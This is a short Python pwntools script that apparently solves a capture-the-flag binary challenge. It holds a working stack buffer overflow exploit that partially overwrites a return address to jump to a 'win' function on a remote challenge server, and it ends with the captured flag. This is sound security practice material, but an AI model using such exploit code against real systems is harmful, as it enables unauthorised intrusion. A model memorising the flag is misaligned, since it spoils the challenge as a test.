# %%

from pwn import *

# ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ee04914473e2edcc2f0cd1fcf5b8fab1590acaf2, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      PIE enabled
# Stack:    Executable
# RWX:      Has RWX segments

# %%

# 0000000000001364 <greet>:
# 00000000000013a8 <main>:
# 00000000000013cb <win>:

# %%

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

argv = ['./src/exploit3.bin']

gdbscript = 'gef\ngef\n'
gdbscript += 'set follow-fork-mode child\n'
gdbscript += 'b main\n'

# conn = gdb.debug(argv, gdbscript)

conn = remote('34.123.210.162', 20234)
# conn = process(argv)

# _pid = gdb.attach(conn, gdbscript)

# %%

print("1")
conn.recvuntil(b"Hello! What's your name?: ")

win_addr = int('cb', 16)

# thanks it is little endian
payload = b"a" * (16 + 8) + p8(win_addr)
print(f"{payload = }")

print("2")
conn.sendline(payload)

print("3")
conn.interactive()

# poctf{uwsp_71m3_15_4_f4c702}
